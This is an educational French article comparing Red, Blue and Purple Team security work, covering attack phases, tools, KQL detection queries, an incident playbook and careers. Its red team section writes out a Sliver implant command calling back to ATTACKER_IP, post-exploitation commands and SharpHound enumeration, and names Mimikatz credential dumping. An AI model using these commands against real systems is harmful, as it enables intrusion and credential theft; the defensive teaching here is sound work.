# Red Team vs Blue Team : les deux faces de la cybersécurité

La cybersécurité se joue comme une partie d'échecs entre attaquants et défenseurs. Le **Red Team** simule les attaquants réels, le **Blue Team** défend l'organisation. Comprendre ces deux rôles est essentiel pour construire une posture de sécurité efficace.

## Red Team : les attaquants éthiques

### Qu'est-ce que le Red Team ?

```
Pentest classique vs Red Team :

Pentest :
→ Périmètre défini et limité
→ Durée : quelques jours à 2 semaines
→ Objectif : trouver des vulnérabilités techniques
→ L'équipe sécurité sait qu'un test a lieu

Red Team :
→ Simulation d'une vraie attaque (APT)
→ Durée : plusieurs semaines à mois
→ Objectif : atteindre un objectif business (ex: "accéder aux données RH")
→ Seule la direction sait → Le Blue Team ne sait pas
→ Teste TOUTE la chaîne : technique + humain + physique
```

### Les phases d'une opération Red Team

```
PHASE 1 : Reconnaissance (2-4 semaines)
→ OSINT sur l'entreprise (LinkedIn, job offers, GitHub)
→ Cartographie infrastructure (DNS, IPs, technologies)
→ Identification des employés clés (IT, finance, direction)
→ Recherche de credentials leakés (Have I Been Pwned, Dehashed)

PHASE 2 : Accès initial (1-2 semaines)
→ Phishing ciblé (spear phishing)
→ Exploitation de vulnérabilités externes (VPN, Exchange, serveurs web)
→ Attaque physique (badge cloning, tailgating)
→ Watering hole (compromission de sites visités par les employés)

PHASE 3 : Établissement du foothold (quelques jours)
→ Installation d'un implant persistent (Cobalt Strike, Sliver, Havoc)
→ Établissement de canaux C2 (Command & Control) discrets
→ Anti-forensics basique (pas de logs bruyants)

PHASE 4 : Mouvement latéral (1-3 semaines)
→ Énumération interne (BloodHound, ADExplorer)
→ Vol de credentials (Mimikatz, LSASS dump)
→ Pivoting vers d'autres segments réseau
→ Compromission progressive vers l'objectif

PHASE 5 : Atteinte de l'objectif
→ Exfiltration de données cibles
→ Accès aux systèmes critiques
→ Preuve de compromission (screenshots, fichiers)

PHASE 6 : Rapport et debriefing
→ Rapport technique détaillé
→ Rapport exécutif (impact business)
→ Purple Team : partage avec le Blue Team
```

### Outils Red Team

```bash
# C2 Framework - Cobalt Strike (standard industrie, payant)
# Alternatives open source :
→ Sliver  : https://github.com/BishopFox/sliver
→ Havoc   : https://github.com/HavocFramework/Havoc
→ Covenant: https://github.com/cobbr/Covenant

# Implant Sliver basique
# Générer un implant
sliver > generate --http ATTACKER_IP:443 --os windows --arch amd64 --name implant

# Listener HTTPS
sliver > https --lport 443

# Post-exploitation
sliver (implant) > info          # Infos système
sliver (implant) > ps            # Processus
sliver (implant) > upload        # Upload de fichiers
sliver (implant) > execute       # Exécuter commandes
sliver (implant) > socks5 start  # Pivot SOCKS5

# Reconnaissance AD avec BloodHound
SharpHound.exe -c All --outputdirectory C:\Temp
# Analyser dans BloodHound UI → trouver les chemins vers Domain Admin
```

## Blue Team : les défenseurs

### Les composantes du Blue Team

```
SOC (Security Operations Center) :
→ Surveillance 24/7 des alertes et événements
→ Triage et investigation des incidents
→ Niveau 1 (triage) → Niveau 2 (investigation) → Niveau 3 (forensics)

DFIR (Digital Forensics & Incident Response) :
→ Réponse aux incidents actifs
→ Analyse forensique post-incident
→ Éradication des attaquants

Threat Intelligence :
→ Veille sur les menaces émergentes
→ IoCs (Indicators of Compromise)
→ Profiling des groupes APT

Vulnerability Management :
→ Scan régulier des vulnérabilités
→ Priorisation et suivi des corrections
→ Patch management
```

### SIEM et détection

```python
# KQL (Kusto Query Language) - Microsoft Sentinel

# Détecter les tentatives de pass-the-hash
SecurityEvent
| where EventID == 4624
| where LogonType == 3  // Network logon
| where AuthenticationPackageName == "NTLM"
| where WorkstationName != ""
| summarize count() by Account, IpAddress, bin(TimeGenerated, 1h)
| where count_ > 10
| order by count_ desc

# Détecter l'utilisation de Mimikatz
SecurityEvent
| where EventID == 10  // Sysmon - ProcessAccess
| where TargetImage endswith "lsass.exe"
| where GrantedAccess has_any ("0x1010", "0x1410", "0x147a", "0x1038")
| project TimeGenerated, Computer, SourceImage, TargetImage, GrantedAccess

# Détecter les connexions Cobalt Strike (beacon)
CommonSecurityLog
| where DeviceVendor == "Palo Alto Networks"
| where DeviceAction == "allow"
| where DestinationPort in (80, 443, 8080, 8443)
| summarize BytesSent=sum(SentBytes), RequestCount=count() by DestinationIP, bin(TimeGenerated, 1h)
| where RequestCount between (10..50)  // Beaconing régulier suspect
| where BytesSent < 1000  // Petites requêtes régulières
```

### Playbooks de réponse aux incidents

```markdown
## Playbook : Compte compromis

### Détection
Alerte : Connexion depuis pays inhabituel OU
         Connexion à des heures anormales OU
         Spray de mots de passe détecté

### Triage (15 minutes)
1. Identifier le compte affecté
2. Vérifier les activités récentes (EventID 4624, 4625)
3. Chercher des connexions simultanées de pays différents
4. Vérifier les emails envoyés dans les dernières 24h

### Confinement (30 minutes)
□ Désactiver le compte AD immédiatement
□ Révoquer toutes les sessions actives (Azure AD → Revoke sessions)
□ Changer le mot de passe
□ Désactiver tous les tokens OAuth/API

### Investigation (2-4 heures)
□ Timeline des activités depuis la compromission
□ Données accédées / exfiltrées ?
□ Persistance installée ?
□ Mouvement latéral depuis ce compte ?
□ Comment le compte a été compromis ?

### Eradication
□ Supprimer toute persistance identifiée
□ Analyser les autres comptes potentiellement compromis

### Recovery
□ Réactiver le compte après sécurisation
□ Informer l'utilisateur + formation phishing

### Leçons apprises
□ Rapport d'incident
□ Amélioration des contrôles (MFA, conditional access)
```

## Purple Team : la collaboration

```
Purple Team = Red Team + Blue Team qui travaillent ENSEMBLE

Approche traditionnelle (silotée) :
Red Team attaque → Rapport → Blue Team corrige
Problème : délai, pas d'apprentissage en temps réel

Purple Team (collaborative) :
Red Team technique → Blue Team observe → Amélioration immédiate
Red lance une technique → Blue : "On l'a détecté ?" → Ajuster les détections

Bénéfices :
→ Détections créées/améliorées en temps réel
→ Blue Team comprend mieux les techniques d'attaque
→ Red Team comprend mieux les capacités de détection
→ ROI bien meilleur qu'un Red Team classique
```

### MITRE ATT&CK pour le Purple Team

```python
# Utiliser ATT&CK pour structurer les exercices Purple Team

exercice_purple = {
    "technique": "T1059.001",
    "nom": "PowerShell",
    "test_red": "powershell.exe -EncodedCommand [base64]",
    "detection_attendue": "Event ID 4104 + pattern base64",
    "regle_sigma": """
        title: Suspicious PowerShell Encoded Command
        detection:
            selection:
                EventID: 4104
                ScriptBlockText|contains: '-EncodedCommand'
            condition: selection
    """,
    "resultat": "DÉTECTÉ" # ou "NON DÉTECTÉ → créer la règle"
}

# Atomic Red Team - Tests ATT&CK automatisés
# https://github.com/redcanaryco/atomic-red-team
# Invoke-AtomicTest T1059.001 -TestNumbers 1
```

## Carrières Red Team vs Blue Team

```
Red Team :
Rôles : Pentester, Red Team Operator, Exploit Developer
Certifications : OSCP, CRTO, OSED, OSEP
Salaire France : 45-90k€/an
Profil : curieux, créatif, persistence, pensée latérale

Blue Team :
Rôles : SOC Analyst, Incident Responder, Threat Hunter, DFIR
Certifications : BlueTeamLabs, GCIH, GCFE, GREM
Salaire France : 40-80k€/an
Profil : analytique, méthodique, résistance au stress, communication

Purple Team :
Rôles : Detection Engineer, Security Engineer
Nécessite : compréhension des deux côtés
Salaire France : 55-100k€/an
Profil : le plus complet, le plus demandé en 2024
```

## Conclusion

Red et Blue Team sont deux faces indissociables d'une cybersécurité efficace. Sans Red Team, le Blue Team ne sait pas contre quoi il se défend. Sans Blue Team, le Red Team n'a aucun impact. Le **Purple Team** représente l'avenir : attaque et défense qui s'informent mutuellement pour construire des organisations réellement résilientes.